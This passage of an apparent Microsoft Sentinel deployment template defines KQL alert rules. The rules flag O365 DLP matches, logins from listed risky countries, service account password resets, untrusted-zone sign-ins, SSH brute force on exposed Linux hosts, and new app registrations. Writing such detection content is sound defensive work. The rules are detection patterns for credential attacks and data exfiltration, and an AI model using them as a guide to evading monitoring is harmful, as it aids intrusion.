          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-884')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-884')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-884: [RBA] O365 - DLP Rule Match",
          "description": "Users or Attackers may occasionally exfiltrate data from legitimate external Web services rather than their primary command and control channel. This rule identifies and creates and incident for Data Loss Prevention alerts from Office 365\n\nInclusions: None\nExclusions: None\n\nConsiderations:\n1. Review Data Loss prevention alert in O365 Security Center by correlating the Time the alert occured and the Workload\n2. Validate activity MITRE: T1567 Category: Microsoft Defender XDR tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let alert_bin=1d;\nlet ingested_lookback = 1d;\nlet generated_lookback = 1d;\nOfficeActivity\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where Operation contains 'DLP'\n| where Operation =~ 'DLPRuleMatch'\n| parse UserId with UserName '@' UserDomain\n| summarize TimeGenerated=min(TimeGenerated), Workload=make_set(OfficeWorkload), Count=count() by UserId, UserName=tolower(UserName), UserDomain=tolower(UserDomain), TimeBin=bin(TimeGenerated, alert_bin)\n| project TimeGenerated, Workload, Count, UserId, UserName, UserDomain",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1567"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-851')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-851')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-851: [RBA] Successful Azure Login From Risky Country",
          "description": "Detects suspicious successful logins from Nigeria, Morocco, Belarus, Russia, North Korea, and Iran. Generally, there should be no logins from these countries so this alert will be triggered by users traveling or malicious logins. This query also looks at historical user agents and applications used by a particular user MITRE: T1110 Category: Microsoft Defender XDR tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let generated_lookback = 7d;\nlet HistoricalSignIns = SigninLogs\n| where TimeGenerated between (ago(generated_lookback) .. ago(1d))\n| where Location in~ (A851_RISKY_COUNTRIES)\n| where ConditionalAccessStatus contains 'success'\n| parse UserPrincipalName with UserName '@' UserDomain\n| summarize HistoricalApps= make_set(AppDisplayName), HistoricalUserAgents = make_set(UserAgent) by UserName\n;\nSigninLogs\n| where TimeGenerated between (ago(1d) .. now())\n| where Location in~ (A851_RISKY_COUNTRIES) or (Location !in~ (A851_ALLOWED_COUNTRIES) and 'TWO LETTER COUNTRYCODE' !in~ (A851_ALLOWED_COUNTRIES))\n| where ConditionalAccessStatus contains 'success'\n| parse UserPrincipalName with UserName '@' UserDomain\n| where UserName !in~ (A851_ALLOWED_USERS)      \n| summarize arg_max(TimeGenerated, *) by UserName, AppDisplayName, UserAgent\n| join kind=innerunique (HistoricalSignIns) on UserName\n| where HistoricalUserAgents !has UserAgent and HistoricalApps !has AppDisplayName\n| project\n    TimeGenerated,\n    UserName,\n    UserDomain,          \n    AppDisplayName,\n    HistoricalApp=tostring(HistoricalApps[0]),\n    UserAgent,\n    HistoricalUserAgent=tostring(HistoricalUserAgents[0]),\n    UserPrincipalName,\n    OperationName,\n    ConditionalAccessStatus,\n    ResultDescription,\n    IPAddress,\n    Location",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-871')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-871')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-871: [RBA] Azure AD - Service Account Password Reset",
          "description": "This alert triggers when a service account password has been changed MITRE: T1072,T1078,T1003,T1110 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 3h; // earliest [log time] boundary    \nlet action = dynamic(['change', 'changed', 'reset']);\nlet pWord = dynamic(['password', 'credentials']);\nAuditLogs\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where Category =~ 'UserManagement'\n| where OperationName has_any (pWord) and OperationName has_any (action)\n| where OperationName !contains ('Self-service')\n| extend AccountType = tostring(TargetResources[0].type), AccountName = tostring(TargetResources[0].userPrincipalName), TargetDisplayName = tolower(tostring(TargetResources[0].displayName)), SourceUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), SourceAadUserId = tostring(parse_json(tostring(InitiatedBy.user)).id), SourceIP = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress), SourceAppSPID = tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalId), SourceAppName = tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n| parse AccountName with TargetUser '@' TargetUserDNS\n| where TargetUser in~ (A871_MONITORED_ACCOUNTS)\n| summarize arg_max(TimeGenerated, *) by SourceUser, TargetUser\n| project TimeGenerated, SourceUser, SourceIP, SourceAadUserId, SourceAppSPID, SourceAppName, TargetUser, TargetDisplayName, TargetUserDNS, OperationName, ResultDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT3H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1072",
            "T1078",
            "T1003",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-845')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-845')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-845: [RBA] Azure AD - Monitored Application Logins Not-In-Zone",
          "description": "Identifies successful logins from IP addresses that are not in the identified trusted zones to the monitored applications.\n\nThis alert is used to validate the policy rules are operational MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "SigninLogs\n| where TimeGenerated between (ago(1h) .. now())\n| where ResultType == 0\n| where isnotempty(NetworkLocationDetails)\n| where A845_MONITORED_APPLICATIONS !contains 'app1'\n| where not(NetworkLocationDetails has_any (A845_TRUSTED_ZONES))\n| where AppDisplayName in (A845_MONITORED_APPLICATIONS)\n| summarize TimeGenerated=max(TimeGenerated), Apps=make_set(AppDisplayName), Resources=make_set(ResourceDisplayName), LocationDetails=make_set(parse_json(NetworkLocationDetails)) by UserPrincipalName, IPAddress, AlertBin=bin(TimeGenerated, 1h)\n| parse UserPrincipalName with Username '@' UserDomain\n| project TimeGenerated, UserPrincipalName, IPAddress, Apps, Resources, LocationDetails, Username, UserDomain",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation",
            "Persistence",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Username"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-027')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-027')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-027: [RBA] Linux - Servers with Authentication Exposed to Public Internet",
          "description": "This alert identifies Linux servers that appear to be accessible from public IP addresses (for authentication). MITRE: T1133 Category: Windows/Linux Machines tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let time_bin = 1h;\nlet ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 3h; // earliest [log time] boundary\nlet alert_id = 'BV-027:';\nlet start_time_suppress = 3d;\nlet PreviousAlerts = toscalar(SecurityAlert\n|where TimeGenerated between (ago(A027_SUPPRESSION_THRESHOLD) .. now())\n|where AlertName has alert_id\n| mv-expand parse_json(Entities)\n| extend IPAddress = iff(Entities.Type =~ 'ip', Entities.Address, '')\n| summarize make_set_if(IPAddress, isnotempty(IPAddress)));\nunion (Syslog\n| where Facility in~ ('auth','authpriv')\n| where TimeGenerated between ( ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where SyslogMessage startswith 'pam_unix(sshd:auth): authentication failure'\n| extend UserName = extract(' user=(\\\\S+)',1,SyslogMessage)\n| extend SourceIP = extract(' rhost=(\\\\S+)',1,SyslogMessage)\n| summarize maxFailTime=max(TimeGenerated), FailedLogins=count() by UserName, SourceIP, TargetIP=HostIP, Computer, bin(TimeGenerated, time_bin)),\n(Syslog\n| where Facility in~ ('auth','authpriv')\n| where TimeGenerated between ( ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where SyslogMessage startswith 'Failed password for invalid user'\n| extend UserName = extract('Failed password for invalid user (\\\\S+)',1,SyslogMessage)\n| extend SourceIP = extract('Failed password for invalid user (\\\\S+) from (\\\\S+) port',2,SyslogMessage)\n| summarize maxFailTime=max(TimeGenerated), FailedLogins=count() by UserName, SourceIP, TargetIP=HostIP, Computer, bin(TimeGenerated, time_bin)),\n(Syslog\n| where Facility in~ ('auth','authpriv')\n| where TimeGenerated between ( ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where SyslogMessage contains 'Accepted password'\n| parse SyslogMessage with * 'Accepted password for ' UserName ' from ' SourceIP ' ' *\n| summarize minSuccessTime=min(TimeGenerated), SuccessfulLogins=count() by UserName, SourceIP, TargetIP=HostIP, Computer, bin(TimeGenerated, time_bin)\n)\n| mv-apply l=A027_EXCLUDED_SOURCE_IP_RANGES to typeof(string) on //Not in IP list\n(\nextend ExcludedSourceIP = ipv4_is_match(l,SourceIP)\n)\n| where isnotempty(UserName) and isnotempty(SourceIP)\n| where ipv4_is_private(SourceIP) == false\n| where UserName in~ (A027_UNIQUE_ACCOUNT_RARELY_USED)\n//| summarize FailedLogins = sum(FailedLogins), SuccessfulLogins = sum(SuccessfulLogins), SourceIP = make_set(SourceIP, 5), NumberOfSourceIPs = dcount(SourceIP) \n//            by TargetUser=UserName, TargetIP, LogSourceHost = Computer, ExcludedSourceIP, minSuccessTime, maxFailTime, bin(TimeGenerated, time_bin)\n| summarize FailedLogins = sum(FailedLogins), SuccessfulLogins = sum(SuccessfulLogins), SourceIP = make_set(SourceIP,5), NumberOfSourceIPs = dcount(SourceIP) \n            by TargetUser=UserName, TargetIP, LogSourceHost = Computer, ExcludedSourceIP, bin(TimeGenerated, time_bin)\n| extend bv_dedup_hash = hash_sha1(strcat(TargetIP))\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash  \n| where FailedLogins >= A027_FAILURE_THRESHOLD\n| extend NonSuppressedEvent = iff(TargetIP !in (PreviousAlerts), true, false)\n//| extend SuccessfulEvents = iff(SuccessfulLogins > 0 and minSuccessTime > maxFailTime, true, false)\n| extend SuccessfulEvents = iff(SuccessfulLogins > 0, true, false)\n| where not(SuccessfulEvents and ExcludedSourceIP and NonSuppressedEvent)\n| extend Class = 'RBA'\n, Tags = 'tag: RBA'\n, Severity = 'Low'\n| extend AlertName = strcat('BV-027: [', Class, '] Linux servers with authentication exposed to Internet')\n| extend Description = 'This alert identify Linux servers that appear to be accessible from public IP addresses (for authentication)'\n| extend Description = strcat(Description, ' MITRE: T1110 Category: Linux ', Tags)\n| extend SystemAlertPlatform = 'Correlation'\n| project-away ExcludedSourceIP, SuccessfulEvents",
          "queryFrequency": "PT1H",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT12H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1133"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "{{Description}}",
            "alertSeverityColumnName": "Severity"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "TargetHost": "LogSourceHost",
            "LogSourceHost": "LogSourceHost",
            "TargetUser": "TargetUser",
            "SourceIP": "SourceIP",
            "TargetIP": "TargetIP",
            "SystemAlertPlatform": "SystemAlertPlatform",
            "Details": "Description"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUser"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "TargetIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-723')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-723')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-723: [RBA] Azure Activity - Non-Compliant Reports",
          "description": "This rule creates an alert for non compliant reports from Azure Policy Monitor MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let policyDefId = 'audit-resources-without-tags-policyDef';\n            AzureActivity\n           |where TimeGenerated between ( ago(1d) .. now())\n           | where CategoryValue =~ 'Policy'\n           | where ActivityStatusValue =~ 'Failed'\n           | where Caller has '@'\n           | extend p=todynamic(Properties)\n           | extend policies=todynamic(tostring(p.policies))\n           | mvexpand policy = policies\n           | extend policyDefinitionReferenceId = tostring(policies[0].policyDefinitionReferenceId)\n           |summarize EventCount=count(),Events=make_set(pack_all(),MaxLimit=5),policyDefinitionReferenceId=make_set(policyDefinitionReferenceId),SubscriptionId=make_set(SubscriptionId),ResourceGroup=make_set(ResourceGroup),ResourceId=make_set(ResourceId) by AccountEmail=Caller,bin(TimeGenerated,1d)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "PolicyNames": "policyDefinitionReferenceId"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountEmail"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-006')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-006')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-006: [RBA] Azure AD - Application Added",
          "description": "A new Azure Application or SPN has been added. Please verify if this is expected. MITRE: T1496,T1585 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-006:';\nlet alert_type = 'RBA';\nlet exclude_hash = true;\nlet calculate_hash = true;      \nlet start_time = 1h;  \nlet end_time = now();\nlet start_time_suppress = 1d;       \nlet latency = 10m;\nlet alert_bin = 1h;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'excluded_dedup_hash_fields': dynamic(['bv_cim_category', 'bv_vendor_', 'bv_act_type'])          \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV006_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_dest_user_type','bv_change_action','bv_vendor_product', 'bv_vendor_reason', 'bv_cim_category', 'bv_act_type']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip', 'bv_dest_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV006_CONFIG['RBASCORE']),1.0);\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nAuditLogs\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and  ingestion_time() >= ago(start_time)\n| where OperationName in~ ('Add application', 'Add service principal')\n| extend bv_rule_version = '1.0.5379'\n| extend bv_rule_timestamp = '1719423385.406157'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5379 bv_rule_timestamp: 1719423385.406157'\n| project TimeGenerated,TargetResources,InitiatedBy,OperationName\n//Targeted Resources\n| extend parsedTargetResources = parse_json(TargetResources) \n| extend AppId=parsedTargetResources[0].id\n| extend DisplayName = tostring(parsedTargetResources[0].displayName)\n|extend ExcludeApp = case(DisplayName in~ (A006_EXCLUDED_APPLICATIONS), true, false)\n//Initiated By\n|extend parsedInitiatedBy = parse_json(InitiatedBy) \n| extend AccountCustomEntity=tolower(tostring(parsedInitiatedBy.user.userPrincipalName))\n| extend IpCustomEntity = tostring(parse_json(tostring(parsedInitiatedBy.user)).ipAddress)\n| where notempty(AccountCustomEntity)\n| extend ExcludeAccount = case( AccountCustomEntity in~(A006_EXCLUDED_USERS), true, false)\n//Final results\n| extend bv_rule_version = '1.0.5379'\n| extend bv_rule_timestamp = '1719423385.406157'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5379 bv_rule_timestamp: 1719423385.406157'\n| project TimeGenerated, AppId, OperationName , DisplayName, AccountCustomEntity,IpCustomEntity,ExcludeApp,ExcludeAccount\n|summarize EventCount=count(), bv_src_app_id = make_set(AppId, 10), bv_src_app =make_set(DisplayName, 10), bv_start_time=min(TimeGenerated),bv_end_time=max(TimeGenerated) by bv_user = AccountCustomEntity,bv_src_ip = IpCustomEntity,ExcludeApp,ExcludeAccount, bv_vendor_action = OperationName, bin_at(TimeGenerated,alert_bin, end_time)\n| where ExcludeApp and 